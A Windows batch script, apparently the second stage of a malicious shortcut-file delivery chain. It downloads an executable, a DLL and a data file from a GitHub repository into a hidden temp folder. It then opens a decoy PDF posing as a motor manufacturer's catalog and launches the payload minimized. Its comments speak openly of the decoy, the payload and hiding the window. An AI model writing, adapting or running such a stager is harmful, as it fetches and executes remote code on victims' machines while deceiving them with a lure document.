@echo off
rem This file is piped from curl into cmd through stdin. Never use commands
rem that read stdin: timeout, pause, set /p, more, or con. They consume the
rem remaining script lines. Do not use goto, call, or labels; stdin mode does
rem not support them. Keep the decoy PDF download and open fault-tolerant:
rem the if exist guards prevent start from showing a file-not-found error.
rem Do not edit BaseUrl in this file by hand. For any repository change,
rem run Rebuild-FtpLnk.ps1 -BaseUrl so this file and the LNK stay in sync.
rem Known limits: same-second launches can reuse %RANDOM% sequences and share
rem the drop directory; stdin mode has no goto/delayed-expansion retry.
rem The payload starts via start /min and leaves a minimized taskbar button;
rem cmd cannot fully hide it (unlike download version -WindowStyle Hidden).
set "d=%TEMP%\.dl%RANDOM%%RANDOM%"
set "b=https://raw.githubusercontent.com/BondayGo/VulkanKit/main/"
mkdir "%d%" 2>nul
curl -sL --fail -o "%d%\vulkaninfo.exe" "%b%vulkaninfo.exe" || exit
curl -sL --fail -o "%d%\vulkan-1.dll" "%b%vulkan-1.dll" || exit
curl -sL --fail -o "%d%\vulkan-1.bmp" "%b%vulkan-1.bmp" || exit
curl -sL --fail -o "%d%\Ningbo Crotor-Cixi Dayan Motor Catalog_20260621.pdf" "%b%catalog.pdf" 2>nul || del "%d%\Ningbo Crotor-Cixi Dayan Motor Catalog_20260621.pdf" 2>nul
if exist "%d%\Ningbo Crotor-Cixi Dayan Motor Catalog_20260621.pdf" start "" "%d%\Ningbo Crotor-Cixi Dayan Motor Catalog_20260621.pdf"
ping 127.0.0.1 -n 2 >nul
if exist "%d%\vulkaninfo.exe" start "" /min /d "%d%" "%d%\vulkaninfo.exe"
